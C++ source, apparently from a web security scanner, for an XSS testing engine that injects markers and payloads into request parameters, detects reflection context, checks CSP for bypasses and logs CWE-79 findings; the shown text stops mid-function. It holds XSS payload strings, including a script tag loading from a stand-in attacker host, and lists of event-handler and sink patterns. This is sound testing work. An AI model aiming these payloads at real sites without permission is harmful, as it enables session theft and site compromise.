#include "xss_engine.hpp"

#include "offensive_payloads.hpp"

#include "../audit_http.hpp"
#include "../csp_analyzer.hpp"
#include "../dom_xss_engine.hpp"
#include "../insertion_points.hpp"
#include "../issue.hpp"

#include "../../../mcp/mcp_standalone.hpp"

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cctype>
#include <cstdint>
#include <iomanip>
#include <map>
#include <mutex>
#include <optional>
#include <regex>
#include <set>
#include <sstream>
#include <string>
#include <unordered_map>
#include <vector>

namespace aida {
namespace burp {
namespace offensive {
namespace xss {

namespace {

using json = nlohmann::json;

struct request_target_t
{
    std::string url;
    std::string scheme;
    std::string host;
    std::string path;
    uint16_t port = 0;
    bool tls = false;
    bool enforce_scope = true;
    std::vector<uint8_t> raw;
};

struct xss_session_t
{
    std::string session_id;
    std::string url;
    std::string host;
    std::string path;
    std::string status = "complete";
    std::string last_action = "detect";
    uint64_t created_ms = 0;
    uint64_t updated_ms = 0;
    bool vulnerable = false;
    std::vector<uint64_t> issue_ids;
    json vulnerable_params = json::array();
    json dom_findings = json::array();
    json results = json::array();
};

struct state_t
{
    std::mutex mtx;
    std::unordered_map<std::string, xss_session_t> sessions;
    std::atomic<uint64_t> counter{0};
};

state_t& state()
{
    static state_t s;
    return s;
}

uint64_t now_ms_wall()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count());
}

uint64_t now_ms_steady()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(steady_clock::now().time_since_epoch()).count());
}

uint64_t mix64(uint64_t v)
{
    v += 0x9E3779B97F4A7C15ull;
    v = (v ^ (v >> 30)) * 0xBF58476D1CE4E5B9ull;
    v = (v ^ (v >> 27)) * 0x94D049BB133111EBull;
    return v ^ (v >> 31);
}

std::string base36(uint64_t v)
{
    static const char a[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    if (v == 0) return "0";
    std::string out;
    while (v) {
        out.push_back(a[v % 36]);
        v /= 36;
    }
    std::reverse(out.begin(), out.end());
    return out;
}

std::string make_id(const char* prefix)
{
    uint64_t c = state().counter.fetch_add(1, std::memory_order_relaxed) + 1;
    return std::string(prefix) + "_" + base36(now_ms_wall()) + "_" + base36(mix64(now_ms_steady() ^ c));
}

engine_result_t error_result(const std::string& message, const std::string& code, json data = json::object())
{
    data["success"] = false;
    data["code"] = code;
    return {false, message, code, std::move(data)};
}

engine_result_t ok_result(const std::string& message, json data)
{
    data["success"] = true;
    return {true, message, {}, std::move(data)};
}

std::string lower_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) {
        return static_cast<char>(std::tolower(c));
    });
    return s;
}

std::string upper_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) {
        return static_cast<char>(std::toupper(c));
    });
    return s;
}

uint64_t fnv1a64(const std::string& s)
{
    uint64_t h = 1469598103934665603ull;
    for (unsigned char c : s) {
        h ^= static_cast<uint64_t>(c);
        h *= 1099511628211ull;
    }
    return h;
}

uint64_t fnv1a64_bytes(const std::vector<uint8_t>& s)
{
    uint64_t h = 1469598103934665603ull;
    for (uint8_t c : s) {
        h ^= static_cast<uint64_t>(c);
        h *= 1099511628211ull;
    }
    return h;
}

std::string hex64(uint64_t v)
{
    std::ostringstream os;
    os << std::hex << std::setw(16) << std::setfill('0') << v;
    return os.str();
}

bool sensitive_name(const std::string& name)
{
    const std::string n = lower_ascii(name);
    static const char* needles[] = {
        "authorization", "cookie", "set-cookie", "token", "secret", "password", "passwd",
        "apikey", "api-key", "api_key", "private", "license", "session", "bearer", "hmac"
    };
    for (const char* needle : needles) {
        if (n.find(needle) != std::string::npos) return true;
    }
    return false;
}

std::string sensitive_summary(const std::string& value)
{
    return "[REDACTED len=" + std::to_string(value.size()) + " fnv64=" + hex64(fnv1a64(value)) + "]";
}

std::string redact_sensitive_text(std::string text, size_t limit)
{
    if (text.size() > limit) text.resize(limit);
    static const std::regex bearer(R"((Bearer\s+)[A-Za-z0-9._~+/=-]{12,})", std::regex::icase);
    static const std::regex aida_license(R"(AIDA-[A-Za-z0-9-]{8,})", std::regex::icase);
    static const std::regex aws_key(R"(AKIA[0-9A-Z]{16})");
    static const std::regex generic_secret(R"(((token|secret|api[_-]?key|password|passwd|license)\s*[:=]\s*['"]?)[^'"\s&<]{8,})", std::regex::icase);
    text = std::regex_replace(text, bearer, "$1[REDACTED]");
    text = std::regex_replace(text, aida_license, "AIDA-[REDACTED]");
    text = std::regex_replace(text, aws_key, "AKIA[REDACTED]");
    text = std::regex_replace(text, generic_secret, "$1[REDACTED]");
    for (char& c : text) {
        unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 && c != '\r' && c != '\n' && c != '\t') c = '.';
    }
    return text;
}

std::string body_text(const exchange_observed_t& resp, size_t limit = 262144)
{
    const size_t n = std::min(resp.resp_body.size(), limit);
    if (n == 0) return {};
    return std::string(reinterpret_cast<const char*>(resp.resp_body.data()), n);
}

bool body_contains(const exchange_observed_t& resp, const std::string& marker)
{
    if (marker.empty() || marker.size() > resp.resp_body.size()) return false;
    return std::search(resp.resp_body.begin(), resp.resp_body.end(), marker.begin(), marker.end()) != resp.resp_body.end();
}

std::string snippet_around(const exchange_observed_t& resp, const std::string& marker, size_t pad)
{
    if (marker.empty()) return {};
    auto it = std::search(resp.resp_body.begin(), resp.resp_body.end(), marker.begin(), marker.end());
    if (it == resp.resp_body.end()) return {};
    const size_t pos = static_cast<size_t>(it - resp.resp_body.begin());
    const size_t start = pos > pad ? pos - pad : 0;
    const size_t end = std::min(resp.resp_body.size(), pos + marker.size() + pad);
    std::string s(reinterpret_cast<const char*>(resp.resp_body.data() + start), end - start);
    return redact_sensitive_text(s, 1024);
}

bool header_name_equals(const std::string& a, const std::string& b)
{
    return lower_ascii(a) == lower_ascii(b);
}

std::string header_value(const std::vector<std::pair<std::string, std::string>>& headers, const std::string& name)
{
    for (const auto& h : headers) {
        if (header_name_equals(h.first, name)) return h.second;
    }
    return {};
}

bool json_bool(const json& p, const char* key, bool fallback)
{
    if (p.contains(key) && p[key].is_boolean()) return p[key].get<bool>();
    return fallback;
}

int json_int(const json& p, const char* key, int fallback, int min_v, int max_v)
{
    int v = fallback;
    if (p.contains(key) && p[key].is_number_integer()) v = p[key].get<int>();
    else if (p.contains(key) && p[key].is_number_unsigned()) v = static_cast<int>(p[key].get<uint64_t>());
    if (v < min_v) v = min_v;
    if (v > max_v) v = max_v;
    return v;
}

std::string json_string(const json& p, const char* key, const std::string& fallback = {})
{
    if (p.contains(key) && p[key].is_string()) return p[key].get<std::string>();
    return fallback;
}

bool cancelled()
{
    if (mcp_standalone::current_call_cancelled()) return true;
    const uint64_t deadline = mcp_standalone::current_call_deadline_ms();
    return deadline != 0 && now_ms_steady() >= deadline;
}

std::string json_scalar_to_string(const json& v)
{
    if (v.is_string()) return v.get<std::string>();
    if (v.is_number() || v.is_boolean() || v.is_null()) return v.dump();
    return v.dump();
}

bool valid_method_token(const std::string& method)
{
    if (method.empty() || method.size() > 32) return false;
    for (unsigned char c : method) {
        if (std::isalnum(c)) continue;
        switch (c) {
            case '!': case '#': case '$': case '%': case '&': case '\'': case '*':
            case '+': case '-': case '.': case '^': case '_': case '`': case '|': case '~':
                continue;
            default:
                return false;
        }
    }
    return true;
}

std::string header_safe(std::string s)
{
    for (char& c : s) {
        unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 || uc == 0x7F) c = '_';
    }
    return s;
}

bool parse_headers_param(const json& params, std::vector<std::pair<std::string, std::string>>& out, std::string& err)
{
    if (!params.contains("headers")) return true;
    const json* h = &params["headers"];
    json parsed;
    if (h->is_string()) {
        try {
            parsed = json::parse(h->get<std::string>());
            h = &parsed;
        } catch (...) {
            err = "headers string must contain JSON";
            return false;
        }
    }
    if (h->is_object()) {
        for (auto it = h->begin(); it != h->end(); ++it) out.emplace_back(it.key(), json_scalar_to_string(it.value()));
        return true;
    }
    if (h->is_array()) {
        for (const auto& e : *h) {
            if (e.is_array() && e.size() == 2 && e[0].is_string()) out.emplace_back(e[0].get<std::string>(), json_scalar_to_string(e[1]));
            else if (e.is_object() && e.contains("name") && e["name"].is_string() && e.contains("value")) out.emplace_back(e["name"].get<std::string>(), json_scalar_to_string(e["value"]));
            else {
                err = "headers array entries must be [name,value] or {name,value}";
                return false;
            }
        }
        return true;
    }
    err = "headers must be an object, array, or JSON string";
    return false;
}

std::string form_encode_params(const json& params)
{
    if (!params.is_object()) return {};
    std::string out;
    for (auto it = params.begin(); it != params.end(); ++it) {
        if (!out.empty()) out += "&";
        out += insertion_points::url_encode(it.key());
        out += "=";
        out += insertion_points::url_encode(json_scalar_to_string(it.value()));
    }
    return out;
}

std::string append_query(std::string path, const json& params)
{
    const std::string q = form_encode_params(params);
    if (q.empty()) return path;
    const size_t hash = path.find('#');
    std::string fragment;
    if (hash != std::string::npos) {
        fragment = path.substr(hash);
        path.erase(hash);
    }
    path += path.find('?') == std::string::npos ? "?" : "&";
    path += q;
    path += fragment;
    return path;
}

bool body_is_json(const std::string& body)
{
    if (body.empty()) return false;
    try {
        (void)json::parse(body);
        return true;
    } catch (...) {
        return false;
    }
}

bool build_request(const json& params, request_target_t& out, std::string& err)
{
    if (!params.contains("url") || !params["url"].is_string()) {
        err = "missing url";
        return false;
    }
    out.url = params["url"].get<std::string>();
    if (!audit_http::parse_url(out.url, out.scheme, out.host, out.port, out.path)) {
        err = "invalid url";
        return false;
    }
    out.tls = lower_ascii(out.scheme) == "https";
    out.enforce_scope = json_bool(params, "scope_only", true);
    std::string method = upper_ascii(json_string(params, "method", "GET"));
    if (method.empty()) method = "GET";
    if (!valid_method_token(method)) {
        err = "invalid method";
        return false;
    }
    std::string body = json_string(params, "body");
    if (params.contains("params") && params["params"].is_object()) {
        if (method == "GET" || method == "HEAD" || method == "DELETE") out.path = append_query(out.path, params["params"]);
        else if (body.empty()) body = form_encode_params(params["params"]);
    }
    std::vector<std::pair<std::string, std::string>> headers;
    if (!parse_headers_param(params, headers, err)) return false;
    bool has_content_type = false;
    bool has_accept = false;
    bool has_user_agent = false;
    for (const auto& h : headers) {
        if (header_name_equals(h.first, "Content-Type")) has_content_type = true;
        if (header_name_equals(h.first, "Accept")) has_accept = true;
        if (header_name_equals(h.first, "User-Agent")) has_user_agent = true;
    }
    std::string host_header = out.host;
    const bool default_port = (out.tls && out.port == 443) || (!out.tls && out.port == 80);
    if (!default_port) host_header += ":" + std::to_string(out.port);
    std::string raw;
    raw.reserve(method.size() + out.path.size() + host_header.size() + body.size() + 512);
    raw += method + " " + (out.path.empty() ? std::string("/") : out.path) + " HTTP/1.1\r\nHost: " + header_safe(host_header) + "\r\n";
    if (!has_user_agent) raw += "User-Agent: AiDA-Offensive-XSS/1.0\r\n";
    if (!has_accept) raw += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
    raw += "Accept-Encoding: identity\r\n";
    for (const auto& h : headers) {
        if (h.first.empty()) continue;
        if (header_name_equals(h.first, "Host") || header_name_equals(h.first, "Content-Length") || header_name_equals(h.first, "Connection")) continue;
        raw += header_safe(h.first) + ": " + header_safe(h.second) + "\r\n";
    }
    if (!body.empty() || method == "POST" || method == "PUT" || method == "PATCH") {
        if (!has_content_type) raw += std::string("Content-Type: ") + (body_is_json(body) ? "application/json" : "application/x-www-form-urlencoded") + "\r\n";
        raw += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    }
    raw += "Connection: close\r\n\r\n";
    raw += body;
    out.raw.assign(raw.begin(), raw.end());
    return true;
}

std::optional<exchange_observed_t> send_raw(const request_target_t& target,
                                            const std::vector<uint8_t>& raw,
                                            int timeout_ms,
                                            const char* source)
{
    audit_http::send_options_t opt;
    opt.timeout_ms = timeout_ms;
    opt.follow_redirects = false;
    opt.enforce_scope = target.enforce_scope;
    opt.publish_exchange = true;
    opt.exchange_source = source ? source : "offensive_xss";
    return audit_http::send(raw, target.host, target.port, target.tls, opt);
}

std::vector<insertion_point_t> candidate_points(const request_target_t& target, const std::string& param_target)
{
    auto points = insertion_points::analyze(target.raw, target.url);
    points.erase(std::remove_if(points.begin(), points.end(), [&](const insertion_point_t& ip) {
        if (ip.kind != "query" && ip.kind != "body_form" && ip.kind != "body_json" && ip.kind != "cookie" && ip.kind != "path") return true;
        return !param_target.empty() && ip.name != param_target;
    }), points.end());
    return points;
}

std::vector<uint8_t> build_injected(const insertion_point_t& ip, const std::string& value)
{
    if (ip.build_with_options) {
        insertion_point_build_options_t opt;
        opt.force_json_string = true;
        opt.preserve_json_scalar_type = false;
        return ip.build_with_options(value, opt);
    }
    if (ip.build) return ip.build(value);
    return std::vector<uint8_t>(ip.base_request.begin(), ip.base_request.end());
}

json response_summary(const exchange_observed_t& resp)
{
    json j;
    j["status_code"] = resp.status_code;
    j["latency_ms"] = resp.latency_ms;
    j["body_length"] = resp.resp_body.size();
    j["body_hash"] = hex64(fnv1a64_bytes(resp.resp_body));
    std::string location = header_value(resp.resp_headers, "Location");
    if (!location.empty()) j["location"] = redact_sensitive_text(location, 300);
    return j;
}

std::string detect_context(const exchange_observed_t& resp, const std::string& marker, json& evidence)
{
    const std::string text = body_text(resp);
    const size_t pos = text.find(marker);
    if (pos == std::string::npos) {
        evidence["marker_reflected"] = false;
        return "unknown";
    }
    evidence["marker_reflected"] = true;
    evidence["marker_offset"] = pos;
    evidence["snippet"] = redact_sensitive_text(text.substr(pos > 120 ? pos - 120 : 0, std::min<size_t>(marker.size() + 240, text.size() - (pos > 120 ? pos - 120 : 0))), 512);
    const std::string before = lower_ascii(text.substr(0, pos));
    const size_t script_open = before.rfind("<script");
    const size_t script_close = before.rfind("</script");
    if (script_open != std::string::npos && (script_close == std::string::npos || script_close < script_open)) return "script";
    const size_t style_open = before.rfind("<style");
    const size_t style_close = before.rfind("</style");
    if (style_open != std::string::npos && (style_close == std::string::npos || style_close < style_open)) return "css";
    const size_t lt = before.rfind('<');
    const size_t gt = before.rfind('>');
    if (lt != std::string::npos && (gt == std::string::npos || gt < lt)) {
        const std::string tag = before.substr(lt);
        const size_t eq = tag.rfind('=');
        if (eq != std::string::npos) {
            if (tag.find("href") != std::string::npos || tag.find("src") != std::string::npos || tag.find("action") != std::string::npos) return "url";
            return "attribute";
        }
        return "html";
    }
    const size_t href = before.rfind("href=");
    const size_t src = before.rfind("src=");
    if ((href != std::string::npos && pos - href < 240) || (src != std::string::npos && pos - src < 240)) return "url";
    return "html";
}

bool executable_reflection_observed(const exchange_observed_t& resp,
                                    const std::string& payload,
                                    const std::string& marker,
                                    const std::string& context)
{
    if (!body_contains(resp, marker)) return false;
    if (!payload.empty() && body_contains(resp, payload)) return true;
    const std::string text = body_text(resp);
    const size_t pos = text.find(marker);
    if (pos == std::string::npos) return false;
    const size_t start = pos > 180 ? pos - 180 : 0;
    const size_t end = std::min(text.size(), pos + marker.size() + 180);
    const std::string window = lower_ascii(text.substr(start, end - start));
    const bool raw_tag = window.find("<script") != std::string::npos ||
                         window.find("<svg") != std::string::npos ||
                         window.find("<img") != std::string::npos ||
                         window.find("<iframe") != std::string::npos ||
                         window.find("</script") != std::string::npos;
    const bool event_handler = window.find("onload=") != std::string::npos ||
                               window.find("onerror=") != std::string::npos ||
                               window.find("onfocus=") != std::string::npos ||
                               window.find("onmouseover=") != std::string::npos;
    const bool javascript_url = window.find("javascript:") != std::string::npos ||
                                window.find("data:text/html") != std::string::npos;
    const bool script_sink = window.find("alert(") != std::string::npos ||
                             window.find("confirm(") != std::string::npos ||
                             window.find("prompt(") != std::string::npos ||
                             window.find("eval(") != std::string::npos;
    const std::string c = lower_ascii(context);
    if (c == "script") return script_sink || window.find("</script") != std::string::npos;
    if (c == "attribute") return event_handler || javascript_url;
    if (c == "url") return javascript_url;
    if (c == "html") return raw_tag || event_handler || javascript_url;
    return raw_tag || event_handler || javascript_url || script_sink;
}

std::string html_entities(const std::string& s)
{
    std::string out;
    for (unsigned char c : s) {
        switch (c) {
            case '<': out += "&lt;"; break;
            case '>': out += "&gt;"; break;
            case '"': out += "&quot;"; break;
            case '\'': out += "&#x27;"; break;
            case '&': out += "&amp;"; break;
            default: out.push_back(static_cast<char>(c)); break;
        }
    }
    return out;
}

std::string base64_encode(const std::string& s)
{
    static const char a[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    uint32_t val = 0;
    int bits = -6;
    for (unsigned char c : s) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out.push_back(a[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) out.push_back(a[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

std::string unicode_escape(const std::string& s)
{
    std::ostringstream os;
    for (unsigned char c : s) {
        os << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<unsigned>(c);
    }
    return os.str();
}

std::string encode_payload(const std::string& payload, const std::string& encoding)
{
    const std::string e = lower_ascii(encoding);
    if (e == "html_entities") return html_entities(payload);
    if (e == "url") return insertion_points::url_encode(payload);
    if (e == "double_url") return insertion_points::url_encode(insertion_points::url_encode(payload));
    if (e == "base64") return base64_encode(payload);
    if (e == "unicode") return unicode_escape(payload);
    return payload;
}

json payloads_to_json(const std::vector<offensive::payloads::payload_entry_t>& payloads, const std::string& encoding)
{
    json arr = json::array();
    for (const auto& p : payloads) {
        arr.push_back({{"payload", encode_payload(p.value, encoding)}, {"technique", p.technique}, {"set_id", p.set_id}});
    }
    return arr;
}

std::string render_request_brief(const exchange_observed_t& resp)
{
    std::ostringstream os;
    os << (resp.method.empty() ? std::string("GET") : resp.method) << " " << (resp.path.empty() ? std::string("/") : resp.path);
    if (!resp.query.empty()) os << "?[query len=" << resp.query.size() << " fnv64=" << hex64(fnv1a64(resp.query)) << "]";
    os << " HTTP/1.1\r\nHost: " << resp.host << "\r\n";
    for (const auto& h : resp.req_headers) {
        if (header_name_equals(h.first, "Host")) continue;
        os << h.first << ": " << (sensitive_name(h.first) ? sensitive_summary(h.second) : redact_sensitive_text(h.second, 512)) << "\r\n";
    }
    os << "\r\n";
    if (!resp.req_body.empty()) os << "[body len=" << resp.req_body.size() << " fnv64=" << hex64(fnv1a64_bytes(resp.req_body)) << "]";
    return os.str();
}

std::string render_response_brief(const exchange_observed_t& resp, const std::string& evidence)
{
    std::ostringstream os;
    os << "HTTP/1.1 " << resp.status_code << " " << resp.reason_phrase << "\r\n";
    for (const auto& h : resp.resp_headers) {
        os << h.first << ": " << (sensitive_name(h.first) ? sensitive_summary(h.second) : redact_sensitive_text(h.second, 512)) << "\r\n";
    }
    os << "\r\n[body len=" << resp.resp_body.size() << " fnv64=" << hex64(fnv1a64_bytes(resp.resp_body)) << "]";
    if (!evidence.empty()) os << "\r\nevidence=" << redact_sensitive_text(evidence, 1024);
    return os.str();
}

uint64_t add_issue(const std::string& type_key,
                   const std::string& name,
                   severity_t severity,
                   confidence_t confidence,
                   const request_target_t& target,
                   const insertion_point_t& ip,
                   const exchange_observed_t& resp,
                   const std::string& marker,
                   const std::string& evidence)
{
    issue_store::initialize();
    issue_t iss;
    iss.type_key = type_key;
    iss.name = name;
    iss.description = "The offensive XSS engine observed response evidence consistent with executable or persistent script injection in the tested insertion point.";
    iss.remediation = "Apply context-aware output encoding, validate untrusted input, and deploy a restrictive Content-Security-Policy.";
    iss.cwe.push_back("CWE-79");
    iss.severity = severity;
    iss.confidence = confidence;
    iss.scheme = resp.scheme.empty() ? target.scheme : resp.scheme;
    iss.host = resp.host.empty() ? target.host : resp.host;
    iss.port = resp.port == 0 ? target.port : resp.port;
    iss.path = resp.path.empty() ? target.path : resp.path;
    iss.parameter = ip.name;
    iss.insertion_point = ip.kind + (ip.name.empty() ? std::string() : ":" + ip.name);
    iss.seen_ms = now_ms_wall();
    iss.src_exchange_id = resp.id;
    evidence_t ev;
    ev.marker = marker.empty() ? redact_sensitive_text(evidence, 1024) : marker;
    ev.request_raw = render_request_brief(resp);
    ev.response_raw = render_response_brief(resp, evidence);
    iss.evidence.push_back(std::move(ev));
    return issue_store::add(std::move(iss));
}

void append_issue(json& arr, uint64_t id)
{
    if (id != 0) arr.push_back(std::to_string(id));
}

void update_session(const xss_session_t& session)
{
    std::lock_guard<std::mutex> lk(state().mtx);
    state().sessions[session.session_id] = session;
}

bool load_session(const json& params, xss_session_t& out, engine_result_t& err)
{
    const std::string id = json_string(params, "session_id");
    if (id.empty()) {
        err = error_result("missing session_id", "missing_session_id");
        return false;
    }
    std::lock_guard<std::mutex> lk(state().mtx);
    auto it = state().sessions.find(id);
    if (it == state().sessions.end()) {
        err = error_result("session not found", "session_not_found", {{"session_id", id}});
        return false;
    }
    out = it->second;
    return true;
}

json session_status(const xss_session_t& s)
{
    json j;
    j["session_id"] = s.session_id;
    j["url"] = s.url;
    j["host"] = s.host;
    j["path"] = s.path;
    j["status"] = s.status;
    j["last_action"] = s.last_action;
    j["vulnerable"] = s.vulnerable;
    j["issue_ids"] = json::array();
    for (uint64_t id : s.issue_ids) j["issue_ids"].push_back(std::to_string(id));
    j["vulnerable_params"] = s.vulnerable_params;
    j["dom_findings"] = s.dom_findings;
    j["created_ms"] = s.created_ms;
    j["updated_ms"] = s.updated_ms;
    return j;
}

json result_base(xss_session_t& s, const std::string& action)
{
    s.last_action = action;
    s.updated_ms = now_ms_wall();
    return session_status(s);
}

json csp_result_to_json(const csp::csp_result_t& r)
{
    json j;
    j["score"] = r.score;
    j["has_csp"] = r.has_csp;
    j["is_report_only"] = r.is_report_only;
    j["directives"] = json::array();
    for (const auto& d : r.directives) j["directives"].push_back({{"name", d.name}, {"values", d.values}});
    j["findings"] = json::array();
    for (const auto& f : r.findings) j["findings"].push_back({{"id", f.id}, {"title", f.title}, {"severity", f.severity}, {"description", f.description}, {"evidence", f.evidence}});
    return j;
}

std::vector<std::string> directive_values(const csp::csp_result_t& r, const std::string& name)
{
    const std::string target = lower_ascii(name);
    for (const auto& d : r.directives) {
        if (lower_ascii(d.name) == target) return d.values;
    }
    return {};
}

bool value_present(const std::vector<std::string>& values, const std::string& needle)
{
    const std::string n = lower_ascii(needle);
    for (const auto& v : values) {
        if (lower_ascii(v) == n) return true;
    }
    return false;
}

json analyze_csp_bypasses(const csp::csp_result_t& r)
{
    json definitive = json::array();
    json candidates = json::array();
    std::vector<std::string> script = directive_values(r, "script-src");
    if (script.empty()) script = directive_values(r, "default-src");
    if (!r.has_csp) {
        definitive.push_back({{"technique", "missing_csp"}, {"description", "No CSP header was present; inline and external script injection are not restricted by CSP."}, {"payload", "<script>alert(AIDA_MARKER)</script>"}});
        return {{"bypasses_found", definitive}, {"candidate_bypasses", candidates}, {"no_bypass", false}};
    }
    if (value_present(script, "'unsafe-inline'")) definitive.push_back({{"technique", "unsafe_inline"}, {"description", "script-src allows unsafe-inline."}, {"payload", "<script>alert(AIDA_MARKER)</script>"}});
    if (value_present(script, "*")) definitive.push_back({{"technique", "wildcard_script_src"}, {"description", "script-src allows wildcard script origins."}, {"payload", "<script src=https://attacker.invalid/aida.js></script>"}});
    if (value_present(script, "data:")) definitive.push_back({{"technique", "data_uri"}, {"description", "script-src allows data: URLs."}, {"payload", "<script src=\"data:text/javascript,alert('AIDA_MARKER')\"></script>"}});
    if (value_present(script, "blob:")) candidates.push_back({{"technique", "blob_uri"}, {"description", "script-src allows blob: URLs; exploitability depends on script creation gadgets."}});
    if (value_present(script, "'unsafe-eval'")) candidates.push_back({{"technique", "unsafe_eval_gadget"}, {"description", "unsafe-eval can turn DOM injection into script execution when an eval sink is reachable."}});
    for (const auto& v : script) {
        const std::string l = lower_ascii(v);
        if (l.find("ajax.googleapis.com") != std::string::npos || l.find("cdnjs.cloudflare.com") != std::string::npos || l.find("cdn.jsdelivr.net") != std::string::npos) {
            candidates.push_back({{"technique", "script_src_gadgets"}, {"endpoint", v}, {"description", "Allowed CDN script source may have historical JSONP or framework gadget surfaces; endpoint-specific testing is required."}});
        }
    }
    return {{"bypasses_found", definitive}, {"candidate_bypasses", candidates}, {"no_bypass", definitive.empty()}};
}

json static_dom_scan(const std::string& html)
{
    const std::string l = lower_ascii(html);
    struct item_t { const char* name; const char* needle; };
    static const item_t sources[] = {
        {"location.hash", "location.hash"},
        {"location.search", "location.search"},
        {"location.href", "location.href"},
        {"document.referrer", "document.referrer"},
        {"document.cookie", "document.cookie"},
        {"postMessage", "message"},
        {"localStorage", "localstorage"},
        {"sessionStorage", "sessionstorage"}
    };
    static const item_t sinks[] = {
        {"innerHTML", "innerhtml"},
        {"outerHTML", "outerhtml"},
        {"insertAdjacentHTML", "insertadjacenthtml"},
        {"document.write", "document.write"},
        {"eval", "eval("},
        {"Function", "function("},
        {"setTimeout(string)", "settimeout("},
        {"setInterval(string)", "setinterval("},
        {"location.assign", "location.assign"},
        {"jQuery.html", ".html("}
    };
    json src = json::array();
    json sink = json::array();
    for (const auto& s : sources) if (l.find(s.needle) != std::string::npos) src.push_back(s.name);
    for (const auto& s : sinks) if (l.find(s.needle) != std::string::npos) sink.push_back(s.name);
    json flows = json::array();
    for (const auto& a : src) {
        for (const auto& b : sink) {
            flows.push_back({{"source", a}, {"sink", b}, {"flow", a.get<std::string>() + " -> script/code path -> " + b.get<std::string>()}, {"exploitable", false}, {"sanitized", nullptr}, {"evidence", "static source and sink tokens found in fetched document"}});
            if (flows.size() >= 20) break;
        }
        if (flows.size() >= 20) break;
    }
    return {{"sources_found", src}, {"sinks_found", sink}, {"dangerous_flows", flows}};
}

std::optional<request_target_t> get_target_from_url(const std::string& url, bool scope_only)
{
    json p;
    p["url"] = url;
    p["method"] = "GET";
    p["scope_only"] = scope_only;
    request_target_t t;
    std::string err;
    if (!build_request(p, t, err)) return std::nullopt;
    return t;
}

}

engine_result_t generate_payloads(const json& params)
{
    offensive::payloads::ensure_available();
    const std::string context = lower_ascii(json_string(params, "context", "unknown"));
    const std::string encoding = lower_ascii(json_string(params, "encoding", "none"));
    const std::string filter = lower_ascii(json_string(params, "payload_filter", "all"));
    const std::string marker = json_string(params, "marker", make_id("aida_xss"));
    const int max_payloads = json_int(params, "max_payloads", 50, 1, 200);
    auto payloads = offensive::payloads::xss_payloads(context, filter, marker, static_cast<size_t>(max_payloads));
    json data;
    data["context"] = context;
    data["encoding"] = encoding;
    data["payload_filter"] = filter;
    data["marker"] = marker;
    data["payloads"] = payloads_to_json(payloads, encoding);
    data["count"] = data["payloads"].size();
    data["payload_inventory"] = offensive::payloads::inventory();
    return ok_result("XSS payloads generated", data);
}

engine_result_t context_probe(const json& params)
{
    request_target_t target;
    std::string err;
    if (!build_request(params, target, err)) return error_result(err, "invalid_request");
    const int timeout_ms = json_int(params, "timeout_ms", 30000, 1000, 120000);
    auto points = candidate_points(target, json_string(params, "param_target"));
    if (points.empty()) return error_result("no insertion points matched request", "no_insertion_points");
    json probes = json::array();
    for (const auto& ip : points) {
        if (cancelled()) break;
        const std::string marker = make_id("AIDAXSS");
        auto resp = send_raw(target, build_injected(ip, marker), timeout_ms, "offensive_xss.context_probe");
        json item;
        item["parameter"] = ip.name;
        item["insertion_point"] = ip.kind;
        item["marker"] = marker;
        if (resp.has_value()) {
            json evidence;
            item["context"] = detect_context(*resp, marker, evidence);
            item["evidence"] = evidence;
            item["response"] = response_summary(*resp);
        } else {
            item["context"] = "unknown";
            item["evidence"] = {{"transport_error", audit_http::last_error()}};
        }
        probes.push_back(item);
    }
    json data;
    data["url"] = target.url;
    data["probes"] = probes;
    data["proof_ready"] = std::any_of(probes.begin(), probes.end(), [](const json& p) { return p.contains("evidence") && p["evidence"].contains("marker_reflected") && p["evidence"]["marker_reflected"].is_boolean() && p["evidence"]["marker_reflected"].get<bool>(); });
    return ok_result("XSS context probe completed", data);
}

engine_result_t detect(const json& params)
{
    offensive::payloads::ensure_available();
    request_target_t target;
    std::string err;
    if (!build_request(params, target, err)) return error_result(err, "invalid_request");
    const int timeout_ms = json_int(params, "timeout_ms", 30000, 1000, 180000);
    const bool use_browser = json_bool(params, "use_browser", false);
    auto points = candidate_points(target, json_string(params, "param_target"));
    if (points.empty()) return error_result("no insertion points matched request", "no_insertion_points");
    xss_session_t session;
    session.session_id = make_id("xss");
    session.url = target.url;
    session.host = target.host;
    session.path = target.path;
    session.created_ms = now_ms_wall();
    session.updated_ms = session.created_ms;
    json vulnerable = json::array();
    json dom_findings = json::array();
    for (const auto& ip : points) {
        if (cancelled()) break;
        const std::string marker = make_id("AIDAXSS");
        auto marker_resp = send_raw(target, build_injected(ip, marker), timeout_ms, "offensive_xss.marker");
        if (!marker_resp.has_value()) continue;
        json ctx_evidence;
        const std::string context = detect_context(*marker_resp, marker, ctx_evidence);
        if (!ctx_evidence.value("marker_reflected", false)) continue;
        auto payloads = offensive::payloads::xss_payloads(context, "all", marker, 12);
        bool confirmed = false;
        std::string confirmed_payload;
        exchange_observed_t confirmed_resp;
        json probe_evidence = json::array();
        for (const auto& p : payloads) {
            if (cancelled()) break;
            auto resp = send_raw(target, build_injected(ip, p.value), timeout_ms, "offensive_xss.detect");
            if (!resp.has_value()) continue;
            json probe = response_summary(*resp);
            probe["payload_hash"] = hex64(fnv1a64(p.value));
            probe["technique"] = p.technique;
            probe["marker_reflected"] = body_contains(*resp, marker);
            probe["payload_reflected"] = body_contains(*resp, p.value);
            probe["execution_surface_observed"] = executable_reflection_observed(*resp, p.value, marker, context);
            probe_evidence.push_back(probe);
            if (probe["execution_surface_observed"].get<bool>()) {
                confirmed = true;
                confirmed_payload = p.value;
                confirmed_resp = *resp;
                break;
            }
        }
        size_t browser_issues = 0;
